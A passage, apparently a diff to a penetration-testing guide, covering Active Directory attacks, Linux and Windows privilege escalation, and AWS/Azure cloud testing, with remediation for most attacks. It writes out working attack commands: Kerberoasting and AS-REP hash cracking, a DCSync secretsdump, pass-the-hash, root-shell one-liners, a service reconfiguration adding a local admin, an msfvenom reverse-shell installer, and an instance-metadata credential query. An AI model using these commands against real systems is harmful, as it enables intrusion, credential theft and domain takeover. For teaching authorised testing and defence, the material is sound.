@@ -85,6 +85,263 @@ The operating system evaluates executable paths in this exact order:
 
 If an unprivileged user possesses write permissions (`FILE_ADD_FILE`) to any intermediate directory (e.g., `C:\`), placing a benign binary named `Program.exe` results in arbitrary code execution running as `NT AUTHORITY\SYSTEM` upon service restart.
 
+### 5.3 Active Directory Penetration Testing: Zero-to-Hero Attack Lifecycles
+
+Active Directory Domain Services (AD DS) manages identity, access, and policy across more than 90% of enterprise environments. For a penetration tester or red team auditor, assessing Active Directory security is an indispensable core competency.
+
+#### 5.3.1 Active Directory Core Architecture from Zero
+
+```
+[ Active Directory Forest: corp.local (Schema Master & Enterprise Admins) ]
+                      │
+        ┌─────────────┴─────────────┐
+        ▼                           ▼
+[ Domain: corp.local ]      [ Domain: dev.corp.local ]
+  (Domain Admins)             (Tree Domain / Two-Way Trust)
+        │
+  ┌─────┴─────────────────────────┐
+  ▼                               ▼
+[ Domain Controllers (DCs) ]   [ Organizational Units (OUs) ]
+  - KDC (Port 88: Kerberos)       - Workstations OU
+  - LDAP (Port 389/636)           - Tier 1 Servers OU
+  - Global Catalog (Port 3268)    - Domain Admins OU
+  - SMB / SYSVOL (Port 445)       - Service Accounts OU
+```
+
+* **Domain Controller (DC)**: The central server hosting the Active Directory database (`NTDS.dit`), executing the Kerberos Key Distribution Center (KDC), and responding to LDAP directory queries.
+* **SYSVOL**: A shared network directory (`\\corp.local\SYSVOL`) replicated to all domain controllers containing Group Policy Objects (GPOs), login scripts, and administrative templates readable by all authenticated domain users.
+* **Service Principal Name (SPN)**: A unique identifier mapping a Windows service instance (e.g., `MSSQLSvc/db01.corp.local:1433`) to an Active Directory logon account under which the service executes.
+
+#### 5.3.2 The Kerberos Authentication Protocol Dance
+
+Kerberos (RFC 4120) is a symmetric-key ticket-based authentication protocol designed to eliminate transmission of cleartext passwords over the network. Understanding its 5-step exchange is essential for diagnosing authentication vulnerabilities:
+
+```
+[ Client (Alice) ]        [ Key Distribution Center (KDC) ]          [ Target Service ]
+       │                                │                                    │
+       ├──── 1. AS-REQ ────────────────>│ (Authentication Service Request)   │
+       │<─── 2. AS-REP ─────────────────┤ (TGT Encrypted with krbtgt key)    │
+       │                                │                                    │
+       ├──── 3. TGS-REQ ───────────────>│ (Ticket-Granting Service Request)  │
+       │<─── 4. TGS-REP ────────────────┤ (Service Ticket with Service Hash) │
+       │                                │                                    │
+       ├──── 5. AP-REQ (Mutual Auth) ───────────────────────────────────────>│
+       │<─── 6. AP-REP (Session Confirm) ────────────────────────────────────┤
+```
+
+1. **AS-REQ (Authentication Service Request)**: Client sends user principal name and a pre-authentication timestamp encrypted using the user's password hash.
+2. **AS-REP (Authentication Service Response)**: The KDC validates the timestamp. It returns a **Ticket Granting Ticket (TGT)** (encrypted using the secret `krbtgt` account key) and a temporary Login Session Key.
+3. **TGS-REQ (Ticket Granting Service Request)**: Client presents the TGT and requests access to an application service identified by its SPN (e.g., `MSSQLSvc/sql01.corp.local`).
+4. **TGS-REP (Ticket Granting Service Response)**: The KDC issues a **Service Ticket (TGS)** encrypted using the target **service account's password hash**, along with a Service Session Key.
+5. **AP-REQ (Application Request)**: Client delivers the Service Ticket directly to the target application server. The service decrypts the ticket using its own password key, verifying the user's Privilege Attribute Certificate (PAC).
+
+---
+
+#### 5.3.3 The Core Active Directory Exploitation Primitives (The Big 6)
+
+##### Attack 1: LLMNR / NBT-NS Poisoning & NTLM Relay
+* **Mechanism**: When Windows clients cannot resolve a hostname via DNS, they fall back to Link-Local Multicast Name Resolution (LLMNR - UDP 5355) and NetBIOS Name Service (NBT-NS - UDP 137), broadcasting queries to the local subnet.
+* **Audit Tooling**: `Responder.py` listens passively on Layer 2. When a victim broadcasts an unresolvable name (e.g., a typo `\\filesharee`), Responder answers, claiming to be the target server. The victim's machine initiates NTLM challenge-response authentication, sending its NetNTLMv2 hash (`username::domain:challenge:response`).
+* **NTLM Relaying**: Instead of cracking the hash, tools like `ntlmrelayx.py` relay the captured authentication challenge live to a secondary server where **SMB Signing is Not Required** or to Active Directory Certificate Services (ADCS), instantly obtaining an administrative command shell.
+* **Remediation**: Disable LLMNR via Group Policy (`Turn off multicast name resolution = Enabled`); disable NetBIOS on all network adapters; mandate SMB Signing (`Digitally sign communications (always) = Enabled`).
+
+##### Attack 2: AS-REP Roasting
+* **Mechanism**: If a user account has the Active Directory attribute `DONT_REQ_PREAUTH` enabled (`Do not require Kerberos preauthentication`), any unauthenticated or low-privileged user can send an `AS-REQ` for that username without providing a password timestamp.
+* **Audit Tooling**: The KDC responds with an `AS-REP` containing a ticket encrypted with the user's password hash. Using `GetNPUsers.py -request -format hashcat -usersfile users.txt corp.local/`:
+  ```bash
+  # Crack offline using Hashcat Mode 18200 (Kerberos 5 AS-REP etype 23)
+  hashcat -m 18200 asrep_hashes.txt rockyou.txt
+  ```
+* **Remediation**: Audit all user accounts and ensure "Do not require Kerberos preauthentication" is unchecked for all domain objects.
+
+##### Attack 3: Kerberoasting
+* **Mechanism**: Any authenticated domain user (even the lowest-privileged guest or compromised workstation) can query Active Directory via LDAP for all accounts with registered `servicePrincipalName` (SPN) attributes. The user then requests a Kerberos Service Ticket (`TGS-REQ`) for each SPN.
+* **Audit Tooling**: The KDC issues the ticket (`TGS-REP`) encrypted with the NTLM/AES key of the user account running that service. The ticket is extracted from memory or network responses:
+  ```bash
+  # Enumerate and extract TGS tickets with Impacket
+  GetUserSPNs.py corp.local/alice:Password123! -dc-ip 10.10.20.10 -request -outputfile kerberoast.hashes
+  
+  # Crack offline on a GPU cluster using Hashcat Mode 13100
+  hashcat -m 13100 kerberoast.hashes rockyou.txt -r rules/best64.rule
+  ```
+* **Remediation**: Replace human-managed user service accounts with **Group Managed Service Accounts (gMSAs)**, which feature 120-character randomized passwords automatically rotated by the domain controller; enforce AES-256 Kerberos encryption.
+
+##### Attack 4: Pass-the-Hash (PtH) & Overpass-the-Hash
+* **Mechanism**: Windows protocols (SMB, RPC, WinRM) authenticate using the NTLM response derived directly from the NT hash (`MD4(UTF16LE(Password))`). The plain-text password is never required. If an auditor recovers an NTLM hash from LSASS memory, SAM, or `secretsdump.py`, they can authenticate directly across the network:
+  ```bash
+  # Authenticate over SMB without cracking the plaintext
+  netexec smb 10.10.20.0/24 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 --local-auth
+  ```
+* **Overpass-the-Hash**: Converts an NTLM hash into a valid Kerberos Ticket Granting Ticket (TGT) by requesting an `AS-REQ` with the hash via `rubeus.exe asktgt` or Impacket `getTGT.py`.
+* **Remediation**: Restrict local administrator accounts using Microsoft LAPS (Local Administrator Password Solution), preventing password re-use across endpoints; add privileged accounts to the **Protected Users** security group (which prohibits NTLM authentication and credential caching in LSASS).
+
+##### Attack 5: DCSync Attack (Replication Rights Abuse)
+* **Mechanism**: Active Directory Domain Controllers replicate directory data between each other using the Directory Replication Service Remote Protocol (MS-DRSR). If an account possesses the extended access rights `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` (granted to Domain Admins, Enterprise Admins, and Administrators by default), it can impersonate a domain controller and request synchronization of the entire directory.
+* **Audit Tooling**:
+  ```bash
+  # Execute DCSync using Impacket secretsdump
+  secretsdump.py corp.local/adminuser:Pass123!@10.10.20.10 -just-dc-user krbtgt
+  ```
+  The DC replies with the cleartext NTLM hash and AES-256 keys of the `krbtgt` account and every domain user, without running any executable code on the Domain Controller.
+* **Remediation**: Strictly audit Active Directory ACLs at the domain root; ensure only genuine Domain Controller computer accounts possess `Replicating Directory Changes` rights.
+
+##### Attack 6: Golden Ticket vs. Silver Ticket Persistence
+
+| Dimension | Golden Ticket (TGT Forgery) | Silver Ticket (TGS Forgery) |
+| :--- | :--- | :--- |
+| **Forged Artifact** | Ticket Granting Ticket (TGT) | Service Ticket (TGS) |
+| **Compromised Secret Key** | `krbtgt` account NTLM hash or AES-256 key | Specific Service Account NTLM/AES key (e.g., `sql_svc`) |
+| **Scope of Access** | **Entire Active Directory Domain** (any user, any machine) | **Specific Service Only** (e.g., MSSQL on `db01`, CIFS on `fs01`) |
+| **Domain Controller Contact**| Injected directly into memory; DC is contacted only to request secondary TGS tickets. | **Zero DC Contact**. The ticket is presented directly to the target application server. |
+| **Default Lifetime** | Up to 10 years (customizable in forged ticket). | Up to 10 years (customizable). |
+| **Detection Difficulty** | High. Appears as valid Kerberos TGT; detected by auditing ticket lifetime anomalies or invalid PAC signatures. | Extreme. Bypasses Domain Controller audit logs completely because the DC is never queried. |
+| **Remediation Procedure** | Reset the `krbtgt` password **twice** with a 24-hour interval between resets to invalidate active TGTs and allow replication. | Reset the service account password twice; migrate service to gMSA. |
+
+---
+
+#### 5.3.4 Graph-Based Attack Path Analysis: BloodHound & SharpHound
+
+Traditional Active Directory audits struggled with multi-hop permission chains. **BloodHound** uses graph theory to map relationships between AD objects (Users, Groups, Computers, OUs, GPOs) to discover hidden attack paths to Domain Admin:
+
+```
+[ Compromised User: bob ] 
+       │ MemberOf
+       ▼
+[ Group: IT Helpdesk ]
+       │ GenericAll (Full Control)
+       ▼
+[ Workstation: WS-ADMIN01 ] ──(Logged On Admin)──> [ Domain Admin: da_john ]
+```
+
+* **High-Risk BloodHound Edges Every Pentester Must Understand**:
+  1. `GenericAll`: Grants complete object control. Allows resetting user passwords (`ForceChangePassword`), adding users to groups (`AddMember`), or modifying object attributes.
+  2. `WriteDacl`: Grants permission to modify the object's Discretionary Access Control List. The attacker adds `GenericAll` for their own user account.
+  3. `GenericWrite`: Grants permission to update any non-protected attribute (e.g., modifying `servicePrincipalName` to conduct Targeted Kerberoasting, or modifying `msDS-AllowedToDelegateTo` for Constrained Delegation abuse).
+  4. `ForceChangePassword`: Allows resetting a victim's password directly without knowing their current credentials.
+  5. `AddMember`: Allows adding arbitrary user accounts into high-privilege groups (e.g., `Domain Admins`, `Account Operators`, `Backup Operators`).
+
+---
+
+### 5.4 Linux & Windows Local Privilege Escalation (PrivEsc) Master Framework
+
+Obtaining an initial remote shell grants access as a low-privileged system user (e.g., `www-data` on Linux or `IIS_IUSRS` / standard domain user on Windows). The objective of local privilege escalation is elevating access to administrative control (`root` on Linux, `NT AUTHORITY\SYSTEM` on Windows).
+
+#### 5.4.1 Linux Privilege Escalation Methodology
+
+```
+[ Step 1: Situational Awareness ]
+  whoami && id && uname -a && cat /etc/os-release && ss -tuln
+        │
+[ Step 2: Sudo Permissions Audit ]
+  sudo -l (Identify commands executable with NOPASSWD)
+        │
+[ Step 3: SUID / SGID Binary Search ]
+  find / -perm -4000 -type f 2>/dev/null (Cross-reference with GTFOBins)
+        │
+[ Step 4: POSIX Capabilities ]
+  getcap -r / 2>/dev/null (Look for cap_setuid, cap_dac_override)
+        │
+[ Step 5: Scheduled Automation & Cron ]
+  cat /etc/crontab /etc/cron.* (Inspect world-writable automated scripts)
+        │
+[ Step 6: Container / Docker Socket Exposure ]
+  ls -l /var/run/docker.sock (Mount host root filesystem in container)
+```
+
+* **Core Linux Vectors & GTFOBins**:
+  1. **Sudo Wildcard / Command Abuse**: If `sudo -l` reveals `(ALL) NOPASSWD: /usr/bin/find`, executing:
+     ```bash
+     sudo find . -exec /bin/sh -p \; -quit
+     ```
+     instantly spawns a root shell.
+  2. **Dangerous Linux Capabilities**: If a binary possesses `cap_setuid+ep` (e.g., `/usr/bin/python3 = cap_setuid+ep`), execution can set real and effective user ID to 0:
+     ```bash
+     python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+     ```
+  3. **Docker Group / Socket Abuse**: If the compromised user belongs to the `docker` group or has write access to `/var/run/docker.sock`, they execute a container mounting the host root filesystem:
+     ```bash
+     docker run -v /:/host -it alpine chroot /host /bin/sh
+     ```
+
+#### 5.4.2 Windows Privilege Escalation Methodology
+
+```
+[ Step 1: Account Context & Privileges ]
+  whoami /all && whoami /priv (Inspect SeImpersonatePrivilege, SeAssignPrimaryToken)
+        │
+[ Step 2: Unquoted Service Paths & Insecure Permissions ]
+  wmic service get name,displayname,pathname,startmode | findstr /i "auto"
+        │
+[ Step 3: AlwaysInstallElevated Policy ]
+  reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+        │
+[ Step 4: Stored Credentials & DPAPI ]
+  cmdkey /list && vaultcmd /list (Look for stored Domain Administrator creds)
+        │
+[ Step 5: Kernel Exploit Fallback (Last Resort) ]
+  systeminfo (Check OS build and missing Hotfixes)
+```
+
+* **Core Windows Vectors**:
+  1. **Token Impersonation (`SeImpersonatePrivilege`)**: Common on IIS service accounts (`iis apppool\defaultapppool`) and MSSQL services. Enables creating a rogue named pipe and coercing a local `SYSTEM` process (via `RpcRemoteFindNextPrinterChange` in PrintSpoofer, or DCOM in SweetPotato/GodPotato) to connect to it, stealing the `SYSTEM` access token.
+  2. **Insecure Service ACLs**: If an unprivileged user possesses `SERVICE_CHANGE_CONFIG` rights on a Windows service, they can reconfigure the service binary path to execute arbitrary commands:
+     ```cmd
+     sc.exe config "VulnerableService" binPath= "cmd.exe /c net localgroup administrators lowprivuser /add"
+     sc.exe stop "VulnerableService"
+     sc.exe start "VulnerableService"
+     ```
+  3. **AlwaysInstallElevated**: If both `HKLM` and `HKCU` registry entries have `AlwaysInstallElevated = 1`, Windows executes `.msi` installation packages with `NT AUTHORITY\SYSTEM` privileges:
+     ```bash
+     msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o update.msi
+     msiexec /quiet /qn /i update.msi
+     ```
+
+---
+
+### 5.5 Cloud Penetration Testing Essentials: AWS & Azure Foundations
+
+As enterprise workloads migrate to public cloud providers, modern penetration testers must audit cloud infrastructure without relying on traditional network port scanning.
+
+#### 5.5.1 The Cloud Shared Responsibility Model
+* **Infrastructure as a Service (IaaS)**: Customer is responsible for OS patching, network firewall rules, IAM roles, application code, and data storage. Cloud provider guarantees physical data center security, hypervisor isolation, and hardware integrity.
+* **Authorization Scope**: Major cloud vendors (AWS, Microsoft Azure, Google Cloud) permit penetration testing of customer-owned virtual machines and serverless functions without prior authorization, provided testing strictly adheres to their **Cloud Rules of Engagement** (e.g., strictly prohibiting DoS attacks or testing shared physical hypervisors).
+
+#### 5.5.2 AWS Penetration Testing Essentials
+
+```
+[ Compromised Web App (SSRF Flaw) ]
+               │
+               ▼
+[ Query AWS Instance Metadata Service (IMDS) ]
+  http://169.254.169.254/latest/meta-data/iam/security-credentials/<RoleName>
+               │
+               ▼
+[ Harvest Temporary Security Credentials (STS) ]
+  AccessKeyId, SecretAccessKey, Token
+               │
+               ▼
+[ Enumerate IAM Permissions & Privilege Escalation ]
+  aws sts get-caller-identity
+```
+
+* **Instance Metadata Service (IMDSv1 vs. IMDSv2)**:
+  * **IMDSv1 (Vulnerable to SSRF)**: Allows reading instance metadata via simple unauthenticated HTTP GET requests (`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`). If a web application contains an SSRF vulnerability, the attacker exfiltrates the EC2 instance's IAM role keys.
+  * **IMDSv2 (Defensive Hardening)**: Mandates session-oriented requests using a `PUT` request with a token header (`X-aws-ec2-metadata-token-ttl-seconds: 21600`) to retrieve a token, which must be passed in subsequent `GET` requests. This neutralizes basic SSRF vectors.
+* **S3 Bucket Security Auditing**:
+  * Testing public read/write exposure:
+    ```bash
+    aws s3 ls s3://target-corp-backups/ --no-sign-request
+    ```
+  * Enforcing bucket policies: Mandate `Block Public Access` at the AWS Organization level; enforce server-side encryption with AWS KMS.
+* **IAM Privilege Escalation Vectors**:
+  * Exploiting `iam:CreatePolicyVersion`: If an IAM user has permission to create a new policy version, they create a version granting `Effect: Allow, Action: *, Resource: *` and set it as default.
+  * Exploiting `iam:AttachUserPolicy`: An attacker attaches the `AdministratorAccess` managed policy directly to their own identity.
+
+#### 5.5.3 Microsoft Azure & Entra ID (Azure AD) Essentials
+* **Entra ID vs. Traditional Active Directory**: Entra ID is a cloud-based identity provider operating over REST APIs (Microsoft Graph) using OAuth 2.0, OpenID Connect, and SAML—it does not use Kerberos, NTLM, or LDAP.
+* **Service Principals & Managed Identities**: Applications hosted in Azure (e.g., App Services, Virtual Machines) use Managed Identities to obtain Azure Resource Manager (ARM) tokens without hardcoding credentials in configuration files.
+* **Azure Key Vault Auditing**: Auditors evaluate Key Vault access policies to verify whether unprivileged application identities can retrieve secrets, connection strings, or administrative signing certificates.
+
 ---
 
 ## 6. Security Perspective: Lateral Movement & Network Trust Boundaries
